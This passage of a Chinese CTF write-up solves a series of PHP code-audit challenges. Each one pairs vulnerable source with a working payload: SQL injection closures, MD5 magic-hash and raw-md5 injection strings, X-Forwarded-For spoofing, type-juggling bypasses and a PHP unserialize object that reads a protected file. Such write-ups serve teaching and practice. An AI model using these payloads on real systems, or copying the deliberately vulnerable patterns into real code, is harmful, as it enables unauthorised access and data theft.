<h2 id="0x09-URLdecode二次编码绕过"><a href="#0x09-URLdecode二次编码绕过" class="headerlink" title="0x09 URLdecode二次编码绕过"></a>0x09 URLdecode二次编码绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] &#x3D; urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Access granted!&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>看源码 hackerDJ不能在提交的参数里面 但是下面urldecode一下之后 要字符串等于hackerDJ才行 </p>
<p>所以我们就需要url编码两次 只需要编码一个字母就行 h的url编码是%68 二次编码后%2568</p>
<p>所以 构造payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;%2568ackerDJ</span><br></pre></td></tr></table></figure>

<h2 id="0xa-sql注入闭合绕过"><a href="#0xa-sql注入闭合绕过" class="headerlink" title="0xa sql注入闭合绕过"></a>0xa sql注入闭合绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    $conn &#x3D; mysql_connect(&quot;*******&quot;, &quot;****&quot;, &quot;****&quot;);</span><br><span class="line">    mysql_select_db(&quot;****&quot;) or die(&quot;Could not select database&quot;);</span><br><span class="line">    if ($conn-&gt;connect_error) &#123;</span><br><span class="line">        die(&quot;Connection failed: &quot; . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">$user &#x3D; $_POST[user];</span><br><span class="line">$pass &#x3D; md5($_POST[pass]);</span><br><span class="line">&#x2F;&#x2F;select user from php where (user&#x3D;&#39;admin&#39;)#</span><br><span class="line">&#x2F;&#x2F;exp:admin&#39;)#</span><br><span class="line">$sql &#x3D; &quot;select user from php where (user&#x3D;&#39;$user&#39;) and (pw&#x3D;&#39;$pass&#39;)&quot;;</span><br><span class="line">$query &#x3D; mysql_query($sql);</span><br><span class="line">if (!$query) &#123;</span><br><span class="line">    printf(&quot;Error: %s\n&quot;, mysql_error($conn));</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$row &#x3D; mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line">&#x2F;&#x2F;echo $row[&quot;pw&quot;];</span><br><span class="line">  if($row[&#39;user&#39;]&#x3D;&#x3D;&quot;admin&quot;) &#123;</span><br><span class="line">    echo &quot;&lt;p&gt;Logged in! Key: *********** &lt;&#x2F;p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  if($row[&#39;user&#39;] !&#x3D; &quot;admin&quot;) &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;You are not admin!&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>看到源码 前面部分还是数据库操作 看到后面额那条sql语句就知道该怎么闭合单引号和括号了</p>
<p>而且后面也只需要user==admin就行 没有比较密码 </p>
<p>所以我们只需要提交admin’)#就行 单引号和括号闭合前面的，#用来注释掉后面的语句部分 使这条语句只查询了admin的用户名 拿去后面比较 就可以出flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?user&#x3D;admin&#39;)#</span><br></pre></td></tr></table></figure>

<h2 id="0xb-X-Forwarded-For绕过指定IP地址"><a href="#0xb-X-Forwarded-For绕过指定IP地址" class="headerlink" title="0xb X-Forwarded-For绕过指定IP地址"></a>0xb X-Forwarded-For绕过指定IP地址</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function GetIP()&#123;</span><br><span class="line">if(!empty($_SERVER[&quot;HTTP_CLIENT_IP&quot;]))</span><br><span class="line">    $cip &#x3D; $_SERVER[&quot;HTTP_CLIENT_IP&quot;];</span><br><span class="line">else if(!empty($_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]))</span><br><span class="line">    $cip &#x3D; $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;];</span><br><span class="line">else if(!empty($_SERVER[&quot;REMOTE_ADDR&quot;]))</span><br><span class="line">    $cip &#x3D; $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">else</span><br><span class="line">    $cip &#x3D; &quot;0.0.0.0&quot;;</span><br><span class="line">return $cip;</span><br><span class="line">&#125;</span><br><span class="line">$GetIPs &#x3D; GetIP();</span><br><span class="line">if ($GetIPs&#x3D;&#x3D;&quot;1.1.1.1&quot;)&#123;</span><br><span class="line">echo &quot;Great! Key is *********&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;错误！你的IP不在访问列表之内！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这个就简单了 直接xff</p>
<p>抓包并在添加一个xff然后重放就行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:1.1.1.1</span><br></pre></td></tr></table></figure>

<h2 id="0xc-MD5加密相等绕过"><a href="#0xc-MD5加密相等绕过" class="headerlink" title="0xc MD5加密相等绕过"></a>0xc MD5加密相等绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$md51 &#x3D; md5(&#39;QNKCDZO&#39;);</span><br><span class="line">$a &#x3D; @$_GET[&#39;a&#39;];</span><br><span class="line">$md52 &#x3D; @md5($a);</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">if ($a !&#x3D; &#39;QNKCDZO&#39; &amp;&amp; $md51 &#x3D;&#x3D; $md52) &#123;</span><br><span class="line">    echo &quot;nctf&#123;*****************&#125;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;false!!!&quot;;</span><br><span class="line">&#125;&#125;</span><br><span class="line">else&#123;echo &quot;please input a&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>看源码 要求 a！=QNKCDZO 但是又要MD5相等 所以这里就要想到PHP会自动判断数据类型</p>
<p>而这些的md5都是类似于0eXXXXXXXX的形式 所以才会比较相等</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">md5(&#39;240610708&#39;) &#x3D;&#x3D; md5(&#39;QNKCDZO&#39;)</span><br><span class="line">var_dump(md5(&#39;aabg7XSs&#39;) &#x3D;&#x3D; md5(&#39;aabC9RqS&#39;));</span><br><span class="line">var_dump(sha1(&#39;aaroZmOk&#39;) &#x3D;&#x3D; sha1(&#39;aaK1STfY&#39;));</span><br><span class="line">var_dump(sha1(&#39;aaO8zKZF&#39;) &#x3D;&#x3D; sha1(&#39;aa3OFF9m&#39;));</span><br><span class="line">var_dump(&#39;0010e2&#39; &#x3D;&#x3D; &#39;1e3&#39;);</span><br><span class="line">var_dump(&#39;0x1234Ab&#39; &#x3D;&#x3D; &#39;1193131&#39;);</span><br><span class="line">var_dump(&#39;0xABCdef&#39; &#x3D;&#x3D; &#39; 0xABCdef&#39;);</span><br></pre></td></tr></table></figure>

<p>这些在PHP里面都是相等的 所以这里我们直接提交240610708即可</p>
<h2 id="0xd-intval函数四舍五入绕过"><a href="#0xd-intval函数四舍五入绕过" class="headerlink" title="0xd intval函数四舍五入绕过"></a>0xd intval函数四舍五入绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_GET[id]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $id &#x3D; intval($_GET[id]);</span><br><span class="line">  $query &#x3D; @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id&#x3D;&#39;$id&#39;&quot;));</span><br><span class="line">  if ($_GET[id]&#x3D;&#x3D;1024) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;no! try again&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else&#123;</span><br><span class="line">    echo($query[content]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>看代码就明白意思了 这里要我们提交一个值 然后拿去查询 很明显是要我们查询1024的值 但是后面又做了比较 </p>
<p>如果直接等于1024不会输出flag 这里就要利用intval的四舍五入 它会自动取整数值 所以我们可以在后面添加小数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1024.4</span><br></pre></td></tr></table></figure>

<h2 id="0xe-strpos数组绕过NULL与ereg正则-00截断"><a href="#0xe-strpos数组绕过NULL与ereg正则-00截断" class="headerlink" title="0xe strpos数组绕过NULL与ereg正则%00截断"></a>0xe strpos数组绕过NULL与ereg正则%00截断</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&quot;;</span><br><span class="line">    if (isset ($_GET[&#39;nctf&#39;])) &#123;</span><br><span class="line">        if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;nctf&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class="line">            echo &#39;必须输入数字才行&#39;;</span><br><span class="line">        else if (strpos ($_GET[&#39;nctf&#39;], &#39;#biubiubiu&#39;) !&#x3D;&#x3D; FALSE)   </span><br><span class="line">            die(&#39;Flag: &#39;.$flag);</span><br><span class="line">        else</span><br><span class="line">            echo &#39;骚年，继续努力吧啊~&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>

<p>代码第一个要求必须提交纯数字 第二个要求要有#!biubiubiu才能输出flag</p>
<p>这里有两种方法可以绕过 strops要求传入参数为字符串 而我们传入一个数组 那么就会返回一个NULL </p>
<p>NULL ！== false 所以条件成立</p>
<p>第二种就是使用00截断 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?nctf[]&#x3D;1</span><br><span class="line">?nctf&#x3D;9%00%23biubiubiu &#x2F;&#x2F;这里注意需要把#编码为%23</span><br></pre></td></tr></table></figure>

<h2 id="0xf-SQL注入or绕过"><a href="#0xf-SQL注入or绕过" class="headerlink" title="0xf SQL注入or绕过"></a>0xf SQL注入or绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#GOAL: login as admin,then get the flag;</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &#39;db.inc.php&#39;;</span><br><span class="line">function clean($str)&#123;</span><br><span class="line">    if(get_magic_quotes_gpc())&#123; &#x2F;&#x2F;get_magic_quotes_gpc — 获取当前 magic_quotes_gpc 的配置选项设置</span><br><span class="line">        $str&#x3D;stripslashes($str); &#x2F;&#x2F;返回一个去除转义反斜线后的字符串（\&#39; 转换为 &#39; 等等）。双反斜线（\\）被转换为单个反斜线（\）。 </span><br><span class="line">    &#125;</span><br><span class="line">    return htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line">$username &#x3D; @clean((string)$_GET[&#39;username&#39;]);</span><br><span class="line">$password &#x3D; @clean((string)$_GET[&#39;password&#39;]);</span><br><span class="line">&#x2F;&#x2F;$query&#x3D;&#39;SELECT * FROM users WHERE name&#x3D;\&#39;&#39;admin\&#39;\&#39; AND pass&#x3D;\&#39;&#39;or 1 #&#39;\&#39;;&#39;;</span><br><span class="line">$query&#x3D;&#39;SELECT * FROM users WHERE name&#x3D;\&#39;&#39;.$username.&#39;\&#39; AND pass&#x3D;\&#39;&#39;.$password.&#39;\&#39;;&#39;;</span><br><span class="line">$result&#x3D;mysql_query($query);</span><br><span class="line">if(!$result || mysql_num_rows($result) &lt; 1)&#123;</span><br><span class="line">    die(&#39;Invalid password!&#39;);</span><br><span class="line">&#125;</span><br><span class="line">echo $flag;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>重点看源码里面的那句sql语句 该怎么闭合这句sql</p>
<p>看到后面输出flag部分 所以要先使得前面的if不成立 后面才会输出flag</p>
<p>就是$result为true或者mysql_num_rows($result) &gt; 1 而且前面的clean函数 会将提交的参数里的转义字符去掉</p>
<p>所以构造payload时要注意添加转义字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin\&#39;\&#39; AND  pass&#x3D;\&#39;&#39;or 1%23&amp;password&#x3D;</span><br></pre></td></tr></table></figure>

<h2 id="0x10-MD5函数绕过"><a href="#0x10-MD5函数绕过" class="headerlink" title="0x10 MD5函数绕过==="></a>0x10 MD5函数绕过===</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag &#x3D; &#39;flag&#123;test&#125;&#39;;</span><br><span class="line">if (isset($_GET[&#39;username&#39;]) and isset($_GET[&#39;password&#39;])) &#123;</span><br><span class="line">    if ($_GET[&#39;username&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])</span><br><span class="line">        print &#39;Your password can not be your username.&#39;;</span><br><span class="line">    else if (md5($_GET[&#39;username&#39;]) &#x3D;&#x3D;&#x3D; md5($_GET[&#39;password&#39;]))</span><br><span class="line">        die(&#39;Flag: &#39;.$flag);</span><br><span class="line">    else</span><br><span class="line">        print &#39;Invalid password&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里注意if里面的是===，这里会比较两者的类型，所以跟前面的==是不一样的</p>
<p>所以这里只能使用数组来绕过，因为PHP对数组的计算都会返回NULL 所以这里直接提交两个数组</p>
<p>使条件成立 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username[]&#x3D;1&amp;password[]&#x3D;2</span><br></pre></td></tr></table></figure>

<h2 id="0x11-十六进制与数字比较"><a href="#0x11-十六进制与数字比较" class="headerlink" title="0x11 十六进制与数字比较"></a>0x11 十六进制与数字比较</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function noother_says_correct($temp)</span><br><span class="line">&#123;</span><br><span class="line">    $flag &#x3D; &#39;flag&#123;test&#125;&#39;;</span><br><span class="line">    $one &#x3D; ord(&#39;1&#39;);  &#x2F;&#x2F;ord — 返回字符的 ASCII 码值</span><br><span class="line">    $nine &#x3D; ord(&#39;9&#39;); &#x2F;&#x2F;ord — 返回字符的 ASCII 码值</span><br><span class="line">    $number &#x3D; &#39;3735929054&#39;;</span><br><span class="line">    &#x2F;&#x2F; Check all the input characters!</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; strlen($number); $i++)</span><br><span class="line">    &#123; </span><br><span class="line">        &#x2F;&#x2F; Disallow all the digits!</span><br><span class="line">        $digit &#x3D; ord($temp&#123;$i&#125;);</span><br><span class="line">        if ( ($digit &gt;&#x3D; $one) &amp;&amp; ($digit &lt;&#x3D; $nine) )</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; Aha, digit not allowed!</span><br><span class="line">            return &quot;flase&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if($number &#x3D;&#x3D; $temp)</span><br><span class="line">        return $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line">echo noother_says_correct($temp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>看源码 发现提交上去的参数会每一个都转为ascii值然后与1和9的ascii比较 不能大于等于1 又不能小于等于9</p>
<p>然后下面有需要与$number相等 number上面为3735929054</p>
<p>这里就需要做一点转变 所以这里我们就把这串数字转换成十六进制 十六进制也是可以进行比较的</p>
<p>所以先转换成十六机制 转换后是：0xdeadc0de</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?password&#x3D;0xdeadc0de</span><br></pre></td></tr></table></figure>

<h2 id="0x12-数字验证正则绕过"><a href="#0x12-数字验证正则绕过" class="headerlink" title="0x12 数字验证正则绕过"></a>0x12 数字验证正则绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag &#x3D; &#39;flag&#123;test&#125;&#39;;</span><br><span class="line">if  (&quot;POST&quot; &#x3D;&#x3D; $_SERVER[&#39;REQUEST_METHOD&#39;]) </span><br><span class="line">&#123; </span><br><span class="line">    $password &#x3D; $_POST[&#39;password&#39;]; </span><br><span class="line">    if (0 &gt;&#x3D; preg_match(&#39;&#x2F;^[[:graph:]]&#123;12,&#125;$&#x2F;&#39;, $password)) &#x2F;&#x2F;preg_match — 执行一个正则表达式匹配</span><br><span class="line">    &#123; </span><br><span class="line">        echo &#39;Wrong Format&#39;; </span><br><span class="line">        exit; </span><br><span class="line">    &#125; </span><br><span class="line">    while (TRUE) </span><br><span class="line">    &#123; </span><br><span class="line">        $reg &#x3D; &#39;&#x2F;([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)&#x2F;&#39;; </span><br><span class="line">        if (6 &gt; preg_match_all($reg, $password, $arr)) </span><br><span class="line">            break; </span><br><span class="line">        $c &#x3D; 0; </span><br><span class="line">        $ps &#x3D; array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); &#x2F;&#x2F;[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母 </span><br><span class="line">        foreach ($ps as $pt) </span><br><span class="line">        &#123; </span><br><span class="line">            if (preg_match(&quot;&#x2F;[[:$pt:]]+&#x2F;&quot;, $password)) </span><br><span class="line">                $c +&#x3D; 1; </span><br><span class="line">        &#125; </span><br><span class="line">        if ($c &lt; 3) break; </span><br><span class="line">        &#x2F;&#x2F;&gt;&#x3D;3，必须包含四种类型三种与三种以上</span><br><span class="line">        if (&quot;42&quot; &#x3D;&#x3D; $password) echo $flag; </span><br><span class="line">        else echo &#39;Wrong password&#39;; </span><br><span class="line">        exit; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>我们先从最开始分析 一开始会对我们post上去的password进行一个正则匹配 </p>
<p>必须要12个字符以上 不然就是报错 格式错误</p>
<p>然后下面进入一个while 里面的第一个if需要我们匹配到的次数在6次以上 否则直接退出</p>
<p>然后下面的foreach 每当匹配到一种类型 就+1 最后需要大于3 所以就需要三种或三种以上的类型</p>
<p>所以这里我们就可以使用科学计数法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password&#x3D;42.00e+0000000000</span><br></pre></td></tr></table></figure>

<h2 id="0x13-弱类型整数大小比较绕过"><a href="#0x13-弱类型整数大小比较绕过" class="headerlink" title="0x13 弱类型整数大小比较绕过"></a>0x13 弱类型整数大小比较绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag &#x3D; &quot;flag&#123;test&#125;&quot;;</span><br><span class="line"></span><br><span class="line">$temp &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line">is_numeric($temp)?die(&quot;no numeric&quot;):NULL;    </span><br><span class="line">if($temp&gt;1336)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里看源码就比较简单 因为PHP是弱类型语言 会自动判断数据类型和转换</p>
<p>这里先判断是否是数字时 可以让它先是字符串 而且与1336比较的时候又成为整数</p>
<p>所以我们传入1377a 所以在is_numeric($temp)判断的时候会把它当字符串处理 所以这里不会这里退出</p>
<p>而后面直接和1336比较的时候 会先intval取整数再与1336比较 所以1337大于1336 然后输出flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?password&#x3D;1337a</span><br></pre></td></tr></table></figure>

<h2 id="0x14-md5函数true注入绕过"><a href="#0x14-md5函数true注入绕过" class="headerlink" title="0x14 md5函数true注入绕过"></a>0x14 md5函数true注入绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">$link &#x3D; mysql_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;);</span><br><span class="line">if (!$link) &#123; </span><br><span class="line">  die(&#39;Could not connect to MySQL: &#39; . mysql_error()); </span><br><span class="line">&#125; </span><br><span class="line">&#x2F;&#x2F; 选择数据库</span><br><span class="line">$db &#x3D; mysql_select_db(&quot;security&quot;, $link);</span><br><span class="line">if(!$db)</span><br><span class="line">&#123;</span><br><span class="line">  echo &#39;select db error&#39;;</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 执行sql</span><br><span class="line">$password &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line">$sql &#x3D; &quot;SELECT * FROM users WHERE password &#x3D; &#39;&quot;.md5($password,true).&quot;&#39;&quot;;</span><br><span class="line">var_dump($sql);</span><br><span class="line">$result&#x3D;mysql_query($sql) or die(&#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line">$row1 &#x3D; mysql_fetch_row($result);</span><br><span class="line">var_dump($row1);</span><br><span class="line">mysql_close($link);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>看代码首先看到有一个md5($password,true)，md5函数第二个参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TRUE – 原始 – 16 字符二进制格式</span><br><span class="line">FALSE – 默认 – 32 字符十六进制数</span><br></pre></td></tr></table></figure>

<p>所以为true的时候，返回的是16字符二进制格式</p>
<p>所以将password的值md5之后 再转为原始的字符 </p>
<p>所以我们需要提交特定的字符串 让md5函数将其当成字符串处理</p>
<p>这个特定字符串被处理后需要有sql的字符 这里有两个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">content: 129581926211651571912466741651878684928</span><br><span class="line">hex: 06da5430449f8f6f23dfc1276f722738</span><br><span class="line">raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1&#39;or&#39;8</span><br><span class="line">string: T0Do#&#39;or&#39;8</span><br><span class="line"></span><br><span class="line">content: ffifdyop</span><br><span class="line">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class="line">raw: &#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span><br><span class="line">string: &#39;or&#39;6]!r,b</span><br></pre></td></tr></table></figure>

<p>所以构造：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?password&#x3D;129581926211651571912466741651878684928</span><br><span class="line">?password&#x3D;ffifdyop</span><br></pre></td></tr></table></figure>

<h2 id="0x15-switch无break-字符与0比较绕过"><a href="#0x15-switch无break-字符与0比较绕过" class="headerlink" title="0x15 switch无break 字符与0比较绕过"></a>0x15 switch无break 字符与0比较绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (isset($_GET[&#39;which&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    $which &#x3D; $_GET[&#39;which&#39;];</span><br><span class="line">    switch ($which)</span><br><span class="line">    &#123;</span><br><span class="line">    case 0:</span><br><span class="line">    case 1:</span><br><span class="line">    case 2:</span><br><span class="line">        require_once $which.&#39;.php&#39;;</span><br><span class="line">         echo $flag;</span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">        echo GWF_HTML::error(&#39;PHP-0817&#39;, &#39;Hacker NoNoNo!&#39;, false);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里我们直接给<code>which</code>为<code>flag</code>，这里会发现在<code>case 0</code>和<code>case 1</code>的时候，没有<code>break</code>，按照常规思维，应该是<code>0</code>比较不成功，进入比较<code>1</code>，然后比较<code>2</code>，再然后进入<code>default</code>，但是事实却不是这样，事实上，在 <code>case 0</code>的时候，字符串和<code>0</code>比较是相等的，进入了<code>case 0</code>的方法体，但是却没有<code>break</code>，这个时候，默认判断已经比较成功了，而如果匹配成功之后，会继续执行后面的语句，这个时候，是不会再继续进行任何判断的。也就是说，我们<code>which</code>传入<code>flag</code>的时候，<code>case 0</code>比较进入了方法体，但是没有<code>break</code>，默认已经匹配成功，往下执行不再判断，进入<code>2</code>的时候，执行了<code>require_once flag.php</code></p>
<h2 id="0x16-unserialize-序列化"><a href="#0x16-unserialize-序列化" class="headerlink" title="0x16 unserialize()序列化"></a>0x16 unserialize()序列化</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- 题目：http:&#x2F;&#x2F;web.jarvisoj.com:32768 --&gt;</span><br><span class="line">&lt;!-- index.php --&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">	require_once(&#39;shield.php&#39;);</span><br><span class="line">	$x &#x3D; new Shield();</span><br><span class="line">	isset($_GET[&#39;class&#39;]) &amp;&amp; $g &#x3D; $_GET[&#39;class&#39;];</span><br><span class="line">	if (!empty($g)) &#123;</span><br><span class="line">		$x &#x3D; unserialize($g);</span><br><span class="line">	&#125;</span><br><span class="line">	echo $x-&gt;readfile();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;showimg.php?img&#x3D;c2hpZWxkLmpwZw&#x3D;&#x3D;&quot; width&#x3D;&quot;100%&quot;&#x2F;&gt;</span><br><span class="line">&lt;!-- shield.php --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	&#x2F;&#x2F;flag is in pctf.php</span><br><span class="line">	class Shield &#123;</span><br><span class="line">		public $file;</span><br><span class="line">		function __construct($filename &#x3D; &#39;&#39;) &#123;</span><br><span class="line">			$this -&gt; file &#x3D; $filename;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		function readfile() &#123;</span><br><span class="line">			if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)&#x3D;&#x3D;&#x3D;FALSE  </span><br><span class="line">			&amp;&amp; stripos($this-&gt;file,&#39;&#x2F;&#39;)&#x3D;&#x3D;&#x3D;FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)&#x3D;&#x3D;FALSE) &#123;</span><br><span class="line">				return @file_get_contents($this-&gt;file);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!-- showimg.php --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	$f &#x3D; $_GET[&#39;img&#39;];</span><br><span class="line">	if (!empty($f)) &#123;</span><br><span class="line">		$f &#x3D; base64_decode($f);</span><br><span class="line">		if (stripos($f,&#39;..&#39;)&#x3D;&#x3D;&#x3D;FALSE &amp;&amp; stripos($f,&#39;&#x2F;&#39;)&#x3D;&#x3D;&#x3D;FALSE &amp;&amp; stripos($f,&#39;\\&#39;)&#x3D;&#x3D;&#x3D;FALSE</span><br><span class="line">		&#x2F;&#x2F;stripos — 查找字符串首次出现的位置（不区分大小写）</span><br><span class="line">		&amp;&amp; stripos($f,&#39;pctf&#39;)&#x3D;&#x3D;&#x3D;FALSE) &#123;</span><br><span class="line">			readfile($f);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			echo &quot;File not found!&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里是有关序列化的操作 这里面一共涉及到了四个php文件 其中flag在pctf.php文件里面</p>
<p>先看index.php  一个Shield对象 一个GET的class参数 然后将g反序列化赋值个x</p>
<p>再调用readfile去读文件 下面一个img标签 又看到showimg.php</p>
<p>showimg.php里面规定了不能直接读取pctf.php文件</p>
<p>Shield.php文件里面 类Shield里面一个公共变量file 一个readfile函数 </p>
<p>那么这里涉及到序列化的操作</p>
<p>有经验的一看就知道应该是将一个已经序列化的对象通过class传给g 再反序列化传给class</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?class&#x3D;O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>提交即可读取pctf.php的内容</p>
